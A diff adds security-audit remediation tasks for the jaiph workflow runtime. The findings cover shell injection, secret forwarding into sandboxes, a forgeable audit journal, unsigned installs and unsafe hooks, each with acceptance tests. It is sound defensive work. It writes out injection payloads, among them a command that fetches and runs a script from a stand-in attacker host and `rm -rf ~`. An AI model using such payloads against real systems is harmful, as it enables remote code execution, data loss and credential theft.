@@ -13,3 +13,175 @@ Process rules:
 7. **Acceptance criteria are non-negotiable.** A task is not done until every acceptance bullet is verified by a test that fails when the contract is violated. "It works on my machine" or "the existing tests pass" is not acceptance.
 
 ***
+
+## Stop splicing untrusted workflow values into `sh -c` #dev-ready
+
+Context: ASI-01/ASI-02, HIGH, confidence 0.85. Finding H-1 — the flagship shell-injection sink, traced end-to-end and confirmed by hand.
+
+Problem: Any non-keyword line in a `workflow { … }` block falls through to a `shell` exec body (`shellFallthrough`, `workflow-brace.ts:769-772`). At runtime the body is interpolated with a bare `String.replace` of `${name}` (zero shell escaping, `runtime-arg-parser.ts:31-44`) and handed to `spawnAndCapture(resolveShell(), ["-c", command], …)` (`executeShLine`, `node-workflow-runtime.ts:1673-1675`). Workflow parameters are caller-controlled: `jaiph mcp`/`jaiph serve` bind tool-call arguments positionally to params (`mcp.ts:129-141`). A caller (or a prompt-injected model) invoking `greet(name)` with `name = "$(curl -s http://attacker/x | sh)"` or `name = "; rm -rf ~ #"` gets arbitrary command execution — host RCE under `--unsafe`/standalone image, in-sandbox code execution + credential theft otherwise. The only guard, `warnPromptInShellLine` (`validate-step.ts:626-649`), inspects `ctx.promptCaptures` only, so it misses parameters, non-prompt captures, channel, and nested-`run` values.
+
+Location: `src/runtime/kernel/node-workflow-runtime.ts:1076-1091` and `:1673-1675`; `src/runtime/kernel/runtime-arg-parser.ts:31-44`; `src/parse/workflow-brace.ts:769-772`; `src/transpile/validate-step.ts:626-649`.
+
+Remediation: Never splice runtime values into `sh -c`. Route them through argv (as `script` steps already do — `run my_script(name)`), or shell-quote every interpolated `${var}` before it enters `sh -c` (a `shellQuote` already exists at `prompt.ts:170-181`). At minimum upgrade the guard to a hard error that fires for any interpolated variable — parameter, capture, iterator, or channel value — in a `shell` body.
+
+### Acceptance criteria
+- A workflow `greet(name) { echo "Hello ${name}" }` invoked with `name = "$(id)"` (via mcp/serve param binding or direct run) does not execute the command substitution — output contains the literal `$(id)` text, not the result of `id`.
+- Invoking the same workflow with `name = "; touch /tmp/pwned #"` does not create `/tmp/pwned` (no shell metacharacter breakout).
+- A test exercises the mcp/serve positional param path (`args[p]`) reaching a `shell` body and asserts no interpolated value is shell-evaluated.
+- If the chosen fix is a hard guard rather than escaping, compiling a `shell` body that interpolates any parameter/capture/iterator/channel variable is a hard error (not a warning), and a test asserts the error for each provenance.
+
+## Exclude host-only `JAIPH_SERVE_*` keys from the sandbox env forward #dev-ready
+
+Context: ASI-08/ASI-05, HIGH, confidence 0.80. Finding H-2 — the serve operator bearer token crosses the sandbox boundary.
+
+Problem: The env allowlist forwards every `JAIPH_*` variable into the container and the agent subprocess, excluding only `JAIPH_DOCKER_*`, `JAIPH_INPLACE*`, and `JAIPH_RUN_WORKFLOW` (`env-allowlist.ts:64-71`, `ENV_ALLOW_PREFIXES = ["JAIPH_"]` at `:31`; Docker forwarding loop `docker.ts:849-856`; `scrubPromptEnv` at `:114-124`). `JAIPH_SERVE_TOKEN` — the single-operator bearer secret authorising the entire HTTP API (`serve.ts:152`) — starts with `JAIPH_` and is not excluded, though the in-container runtime never consumes it. So every workflow the server invokes inherits `-e JAIPH_SERVE_TOKEN=<secret>` (plus `JAIPH_SERVE_OIDC_*` and other host-only server keys). A malicious or H-1-injectable workflow reads the token, exfiltrates it over the default-on network, and authenticates back to the server as the operator (full invoke/inspect/cancel).
+
+Location: `src/runtime/kernel/env-allowlist.ts:31`, `:64-71`, `:114-124`; `src/runtime/docker.ts:849-856`; `src/cli/commands/serve.ts:152`; `src/cli/run/env.ts`.
+
+Remediation: Stop blanket-forwarding `JAIPH_*`. Add a `JAIPH_SERVE_` exclusion mirroring the existing `ENV_ALLOW_EXCLUDE_PREFIX = "JAIPH_DOCKER_"`, or — safer — invert to an explicit allowlist of the specific runtime-consumed `JAIPH_*` names. Apply the same scrub in `scrubPromptEnv` so the token never reaches an agent/LLM subprocess.
+
+### Acceptance criteria
+- With `JAIPH_SERVE_TOKEN` set in the host environment, a Docker run does not receive `-e JAIPH_SERVE_TOKEN` (a test asserts the token key is absent from the forwarded Docker env args).
+- `isEnvAllowed("JAIPH_SERVE_TOKEN")` returns false, and the same holds for `JAIPH_SERVE_OIDC_*` and other host-only `JAIPH_SERVE_*` keys.
+- `scrubPromptEnv` removes `JAIPH_SERVE_*` keys so they never reach an agent subprocess (a test asserts absence).
+- Runtime-consumed `JAIPH_*` variables that workflows legitimately need still cross the boundary (a test asserts they are retained).
+
+## Make the run audit journal tamper-resistant and actually verified #dev-ready
+
+Context: ASI-06, HIGH, confidence 0.85. Finding H-3 — the audit journal is written by the audited party behind an unkeyed chain that no production code path verifies.
+
+Problem: Each `run_summary.jsonl` line carries `prev_hash`, an unkeyed SHA-256 over a public genesis constant maintained only in process memory (`CHAIN_GENESIS` and `sha256hex` in `emit.ts:9-14`; append in `runtime-event-emitter.ts:66-70`, `emit.ts:53-58`). The journal is written into `.jaiph/runs/…` under the workflow's own `cwd`, exported to every script step as `JAIPH_RUN_DIR` (`node-workflow-runtime.ts:302-311`). So the audited subject can write its own audit trail. Because the chain is unkeyed with a public algorithm, a workflow can rewrite the file with a fully recomputed, internally valid chain that omits incriminating lines (e.g. a script step running `rm -f "$JAIPH_RUN_DIR/run_summary.jsonl"`, or a rewrite). And `verifyRunSummaryChain` (`emit.ts:24-44`) is never invoked outside `emit.test.ts` — `jaiph run`, `serve`, `mcp`, telemetry export, and run listing all silently accept a broken/truncated chain. Per-step `.out`/`.err` files are likewise deletable.
+
+Location: `src/runtime/kernel/runtime-event-emitter.ts:66-70`; `src/runtime/kernel/emit.ts:9-14`, `:24-44`, `:53-58`; `src/runtime/kernel/node-workflow-runtime.ts:302-311`.
+
+Remediation: Move the journal out of the workflow's write scope (a host/parent-owned append-only sink, or an external collector — the host already tails the `__JAIPH_EVENT__` stream and can persist that copy). Replace the unkeyed chain with an HMAC or signature under a key the workflow process never sees, hold the running head hash in the parent, and actually call `verifyRunSummaryChain` (hard-fail on `ok:false`) at every read/export boundary.
+
+### Acceptance criteria
+- The journal is written to a location (or via a mechanism) the workflow's own script steps cannot write to; a test demonstrates a script step cannot alter or delete the authoritative journal.
+- The chain integrity value is keyed (HMAC/signature) under a key not present in the workflow/agent subprocess environment; a test confirms the key is absent from the forwarded env.
+- `verifyRunSummaryChain` (or its equivalent) is invoked at each read/export boundary (run listing, `/v1/runs/{id}/events`, OTLP/Sentry export) and hard-fails on `ok:false`; a test feeds a tampered chain and asserts the read/export path rejects it.
+- A recomputed-but-forged chain (valid under the public SHA-256 algorithm, without the key) is rejected by verification.
+
+## Add integrity verification to `jaiph install` and the library registry #dev-ready
+
+Context: ASI-09, HIGH, confidence 0.85. Finding H-4 — library installs are trust-on-first-use with no signature, checksum, or pin.
+
+Problem: A library install is `git clone --depth 1 [--branch <ref>] <url> <libDir>` and nothing more — no SHA-256, no signature, no use of `jaiph.pub` (`install.ts:196-203`; post-clone check only verifies a `.jh` exists and strips `.git` at `:167-193`). Registry entries map a name to a `url`+`description` with no pinned commit (`registry.ts:105-113`) and no URL-scheme restriction (only `typeof url === "string" && url.length > 0`). The registry index is fetched over a bare `fetch(source)` with no signature (`registry.ts:57-79`), and `JAIPH_REGISTRY` (`:34-38`) can repoint it to any URL including plain `http://` (only presence of `://` is checked). The commit is pinned in a lockfile only after the first clone — the initial install is unauthenticated, and library code executes at `jaiph run` time. An attacker who compromises an upstream repo, moves a tag, compromises/MITMs the registry host, or sets `JAIPH_REGISTRY` achieves end-to-end code substitution.
+
+Location: `src/cli/commands/install.ts:167-193`, `:196-203`; `src/cli/commands/registry.ts:34-38`, `:57-79`, `:105-113`.
+
+Remediation: Resolve each ref to a commit SHA and pin it in the registry entry (not just the post-hoc lockfile); sign the registry index (reuse the minisign key + `jaiph.pub`) and verify it; require `https://`/`ssh://` for remote sources and enforce a URL-scheme allowlist; support an optional detached signature per library and fail closed on mismatch.
+
+### Acceptance criteria
+- The registry index is signature-verified after fetch; a tampered/unsigned index is rejected (a test asserts fail-closed).
+- Remote registry/library sources must use an allowed scheme (`https://`/`ssh://`); a `http://` or otherwise disallowed URL is rejected (a test asserts rejection).
+- Registry entries carry a pinned commit SHA and the install verifies the cloned HEAD matches it; a mismatch fails the install (a test asserts rejection).
+- When an optional detached library signature is present, an invalid signature fails the install closed (a test asserts rejection).
+
+## Restrict `docker_network` / `docker_image` to host control #dev-ready
+
+Context: ASI-03/ASI-08, MEDIUM, confidence 0.80. Finding M-6 — a workflow file can gut the sandbox it runs in.
+
+Problem: When the operator has not set `JAIPH_DOCKER_NETWORK`, the entry file's `runtime.docker_network` wins over `default` and is emitted verbatim as `--network <value>` (`docker.ts:151-155`, `:828-830`); the in-file value from `config { runtime { … } }` (`config.ts:104-112`) is never content-validated (`validate-config.ts` checks only `${}` interpolation identifiers). `docker_network = "host"` launches the container in the host network namespace — reaching loopback-only services (a local DB, another `jaiph serve` on 127.0.0.1, a metadata endpoint) and binding host ports; `container:<name>`/`ns:*` join another namespace. `runtime.docker_image` likewise points the sandbox at an arbitrary image. A repo-supplied or model-edited workflow shipping `config { runtime { docker_network = "host" } }` runs with host networking while still appearing "sandboxed."
+
+Location: `src/runtime/docker.ts:151-155`, `:828-830`; `src/config.ts:104-112`; `src/transpile/validate-config.ts`.
+
+Remediation: Treat `runtime.docker_network` and `runtime.docker_image` as host-controlled only (the way `runtime.docker_enabled` is already parse-rejected), or validate against an allowlist (`default`, `none`, named bridge networks) and reject `host` / `container:*` / `ns:*` unless supplied via operator env/flag.
+
+### Acceptance criteria
+- An entry file declaring `config { runtime { docker_network = "host" } }` does not produce `--network host` unless the operator supplied it via env/flag; a test asserts the file-declared value is rejected or overridden.
+- File-declared `docker_network` values of `container:*` and `ns:*` are rejected (a test asserts rejection).
+- A file-declared `docker_image` is not honoured unless host-controlled (or is validated against the intended policy); a test asserts the behaviour.
+- Operator-supplied `JAIPH_DOCKER_NETWORK` / image (env/flag) still takes effect (a test asserts the host-controlled path works).
+
+## Require operator opt-in before honouring entry-file `trusted_envs` #dev-ready
+
+Context: ASI-08, MEDIUM, confidence 0.75. Finding M-7 — a file-declared `trusted_envs` injects arbitrary host secrets into the sandbox, bypassing the allowlist.
+
+Problem: The entry file's `config { trusted_envs = "…" }` is resolved from the operator's host environment (`trusted-envs.ts:55-63`), merged into `extraEnv` (`run.ts:270`), and forwarded verbatim — bypassing `isEnvAllowed` (`docker.ts:859-861`). The reserved-key filter `isReservedEnvKey` (`env-reserved.ts:19-40`) blocks only `JAIPH_*`, not arbitrary secret names. So an untrusted/model-edited entry `.jh` declaring `config { trusted_envs = "AWS_SECRET_ACCESS_KEY GITHUB_TOKEN" }` pulls those host secrets from the operator's environment into the sandbox, where a `run` step exfiltrates them over the default network. The allowlist meant to keep host secrets out is defeated by a declaration in the file the sandbox is meant to contain. (Imported modules are correctly blocked from declaring `trusted_envs`; the entry file is not.)
+
+Location: `src/cli/run/trusted-envs.ts:55-63`; `src/cli/commands/run.ts:270`; `src/runtime/docker.ts:859-861`; `src/env-reserved.ts:19-40`.
+
+Remediation: Require a host-side opt-in (env/flag) before any entry-file `trusted_envs` value is honoured — so the operator, not the file, consents to which host secrets cross — and document that authoring the entry file is a trust boundary equal to `--env`.
+
+### Acceptance criteria
+- An entry file declaring `config { trusted_envs = "AWS_SECRET_ACCESS_KEY" }` does not forward that host secret into the sandbox absent an operator opt-in; a test asserts the key is absent from forwarded env.
+- With the operator opt-in (env/flag) present, the declared `trusted_envs` keys are forwarded; a test asserts the opt-in path works.
+- The behaviour holds for arbitrary non-`JAIPH_` secret names (a test covers at least one such name).
+
+## Harden the image `jaiph`-presence probe and drop its login shell #dev-ready
+
+Context: ASI-05, MEDIUM, confidence 0.72. Finding M-8 — the image probe runs a workflow-selected image with none of the run hardening.
+
+Problem: `imageHasJaiph` (`docker.ts:289-299`) runs `docker run --rm --entrypoint sh <image> -lc "command -v jaiph …"` with no `--cap-drop ALL`, no `--user`, no `--security-opt no-new-privileges`, and no `--network none` — unlike `buildDockerArgs`. The image derives from the entry file's `runtime.docker_image` (`docker.ts:145-149`) and is `docker pull`ed first (`:277-287`). `sh -lc` is a login shell, so it sources `/etc/profile` and `/etc/profile.d/*` — scripts baked into an attacker-chosen image execute as the image's default user (typically root), with default capabilities, new-privileges allowed, and default bridge egress. An untrusted `.jh` setting `runtime.docker_image = "attacker/img:tag"` gets attacker profile scripts run at higher privilege than the real hardened run.
+
+Location: `src/runtime/docker.ts:145-149`, `:277-287`, `:289-299`.
+
+Remediation: Apply the same hardening flags to the probe (`--cap-drop ALL`, `--user`, `--security-opt no-new-privileges`, `--network none`) and drop the `-l` login flag (`sh -c`); better, detect `jaiph` without executing image-controlled code (`docker inspect` / a pinned entrypoint), and gate `runtime.docker_image` to host control (see the docker_network/docker_image task).
+
+### Acceptance criteria
+- The probe invocation includes `--cap-drop ALL`, `--security-opt no-new-privileges`, a non-root `--user`, and `--network none` (a test asserts these flags are present in the probe args).
+- The probe shell no longer uses the `-l` login flag (a test asserts `sh -c`, not `sh -lc`), or the probe no longer executes image-controlled code at all.
+- A test asserts profile scripts baked into the probed image are not sourced/executed by the probe.
+
+## Reject or distinctly identify OIDC tokens lacking `sub` #dev-ready
+
+Context: ASI-07/ASI-04, MEDIUM, confidence 0.72. Finding M-9 — `sub`-less OIDC tokens collapse to one shared `unknown` principal.
+
+Problem: `auth.ts:228` sets `const subject = typeof payload.sub === "string" && payload.sub.length > 0 ? payload.sub : "unknown";`. Per-principal isolation keys entirely on `principal.subject` (`handler.ts` `lookupRun`/`listRuns` and the idempotency composite key). OIDC principals are scoped (`ownsAllRuns:false`) and may inspect/cancel only their own runs — but any two callers whose verified tokens omit `sub` (common for OAuth2 client-credentials / machine tokens) both authenticate as `subject === "unknown"` and share one run-visibility bucket. Two services on the same issuer with `sub`-less tokens let client B enumerate and cancel client A's runs and collide on A's `Idempotency-Key`.
+
+Location: `src/cli/serve/auth.ts:228`; `src/cli/serve/handler.ts` (`lookupRun`/`listRuns`, idempotency key).
+
+Remediation: Reject a verified token that lacks a non-empty `sub` (401), or derive identity from `sub` else `client_id` else fail — never a shared constant.
+
+### Acceptance criteria
+- A verified OIDC token with no `sub` (and no fallback identity claim) is rejected with 401, or maps to a distinct per-caller identity rather than the shared `"unknown"` constant.
+- Two distinct `sub`-less tokens never share a run-visibility bucket or idempotency namespace; a test asserts client B cannot enumerate/cancel client A's runs.
+- A test asserts no principal is ever assigned the literal `subject === "unknown"` for isolation purposes.
+
+## Gate project-local `.jaiph/hooks.json` behind a workspace-trust decision #dev-ready
+
+Context: ASI-03/ASI-05, MEDIUM, confidence 0.80. Finding M-10 — project hooks execute on the host with no trust gate.
+
+Problem: Hooks run on the host CLI even for Docker runs (`hooks.ts:127-169`, `spawn(resolveShell(), ["-c", cmd], …)`), and a project-local `<workspace>/.jaiph/hooks.json` is loaded and executed automatically on `jaiph run` with no confirmation, allowlist, or workspace-trust prompt (`hooks.ts:96-119`, registered at `run.ts:140,243`). The hook payload is delivered safely on stdin, but the hook command strings come from a file that may have arrived with an untrusted repository. Docs call it "trusted config" (`docs/sandboxing.md:112`) but nothing enforces that boundary. A user cloning a shared Jaiph repo and running any workflow (`jaiph run flow.jh`) executes a malicious `.jaiph/hooks.json`'s arbitrary host commands on `workflow_start` — before and outside the Docker sandbox.
+
+Location: `src/cli/run/hooks.ts:96-119`, `:127-169`; `src/cli/commands/run.ts:140`, `:243`; `docs/sandboxing.md:112`.
+
+Remediation: Gate project-local hooks behind an explicit per-workspace trust decision (prompt on first use, or an opt-in flag / allowlist), mirroring editor "workspace trust." Global `~/.jaiph/hooks.json` can remain implicitly trusted.
+
+### Acceptance criteria
+- Running a workflow in a workspace with an untrusted project-local `.jaiph/hooks.json` does not execute its hook commands without an explicit trust decision; a test asserts the hook does not run absent trust.
+- After the operator grants trust (prompt/flag/allowlist), the project hooks run; a test asserts the trusted path works.
+- Global `~/.jaiph/hooks.json` continues to run without the workspace-trust gate; a test asserts global hooks are unaffected.
+
+## Make release-install and runtime-image toolchain verification fail-closed #dev-ready
+
+Context: ASI-09, MEDIUM, confidence 0.80. Finding M-11 — release-install verification is fail-open and the runtime image pulls toolchains without checksums.
+
+Problem: The release binary's minisign signature is checked only when `minisign` is on PATH; otherwise the installer warns and continues (`docs/install:242-256`), so a default host with no minisign degrades to checksum-only — and the checksum arrives from the same channel as the binary. `JAIPH_RELEASE_BASE_URL` / `JAIPH_MINISIGN_PUBLIC_KEY` are overridable and an empty key silently skips verification (`docs/install:213,242-243`). The bootstrap pipes an unsigned script to `bash` with an env-overridable origin (`use.ts:37-42`, `docs/run`). The runtime image fetches/executes toolchain installers (uv/rustup/bun/cursor-agent checksum ARGs default to `""` → skip; go/yq/kubectl/aws-cli/go-task fetched with no checksum) in `runtime/Dockerfile`. An attacker compromising the GitHub Release (or the channel via `JAIPH_RELEASE_BASE_URL`) can replace the binary and `SHA256SUMS` consistently and pass the checksum without the signature ever being checked; a compromised toolchain CDN poisons default runtime-image builds.
+
+Location: `docs/install:213`, `:242-256`; `src/cli/commands/use.ts:37-42`; `runtime/Dockerfile`.
+
+Remediation: Make signature verification mandatory for non-CI installs (bootstrap a pinned verifier, or treat "minisign unavailable" as fail-closed); publish and check a hash/signature of the install script itself; treat an empty `JAIPH_MINISIGN_PUBLIC_KEY` as fail-closed, not skip; populate and require the Dockerfile SHA-256 ARGs and add `sha256sum -c` for go/yq/kubectl/aws/task.
+
+### Acceptance criteria
+- A non-CI install with `minisign` unavailable fails closed rather than continuing on checksum-only; a test/harness asserts the installer aborts.
+- An empty `JAIPH_MINISIGN_PUBLIC_KEY` causes verification to fail closed, not skip; a test asserts the abort.
+- The runtime `Dockerfile` requires a non-empty SHA-256 for each toolchain fetch (uv/rustup/bun/cursor-agent and go/yq/kubectl/aws-cli/go-task) and runs `sha256sum -c`; a build with a mismatched/empty checksum fails.
+- The install/bootstrap script's own integrity is verified before execution (hash/signature check); a test/harness asserts a tampered script is rejected.
+
+## Broaden and canonicalise credential redaction #dev-ready
+
+Context: ASI-06, MEDIUM, confidence 0.85. Finding M-5 — redaction misses common secret names and is literal-substring only.
+
+Problem: `redactCredentials` fires only for env keys ending in one of four suffixes (`CREDENTIAL_KEY_SUFFIXES = ["_API_KEY","_TOKEN","_SECRET","_API_TOKEN"]`, `redact.ts:9`, `:11-14`), so it silently misses `AWS_SECRET_ACCESS_KEY` (ends `_ACCESS_KEY`), `AWS_ACCESS_KEY_ID`, `*_SECRET_KEY`/`STRIPE_SECRET_KEY`, `*_PASSWORD`/`PASSWORD`, `PASSPHRASE`, `*_PRIVATE_KEY`, `*_CREDENTIALS`, and password-bearing `DATABASE_URL`. Even for matched keys it is an exact-literal substring replace with a `< 8` char floor (`:17-24`), so base64/URL-encoding/hex/JSON-escaping or a secret split across chunks evades it, and short secrets are never redacted. The same `redactCredentials` feeds the journal, OTLP (`otlp.ts`), Sentry (`sentry.ts`), and `/v1/runs/{id}/events` (`handler.ts`) — exactly where operators are told to expect `[REDACTED]`.
+
+Location: `src/runtime/kernel/redact.ts:9`, `:11-14`, `:17-24`.
+
+Remediation: Broaden detection well beyond four suffixes (`_ACCESS_KEY`, `_SECRET_KEY`, `PASSWORD`, `PASSPHRASE`, `PRIVATE_KEY`, `CREDENTIAL(S)`, `_PAT`, `_DSN`, and substring `SECRET`/`PASSWORD`/`TOKEN`), add canonicalisation passes for base64/hex/url-encoded forms of known values, drop or lower the 8-char floor, and document the literal-substring limit as an explicit non-guarantee.
+
+### Acceptance criteria
+- `isCredentialKey` matches `AWS_SECRET_ACCESS_KEY`, `AWS_ACCESS_KEY_ID`, `STRIPE_SECRET_KEY`, `DB_PASSWORD`, `PASSPHRASE`, `SSH_PRIVATE_KEY`, and `SERVICE_CREDENTIALS`; a test asserts each is detected.
+- A base64-encoded form of a known secret value is redacted in output; a test asserts the encoded form is caught.
+- The 8-char floor is removed or lowered so short secrets are redacted; a test asserts a short known secret is redacted.
+- Redaction improvements apply uniformly across journal, OTLP, Sentry, and `/events`; a test asserts a newly-detected secret is redacted on at least the `/events` path.
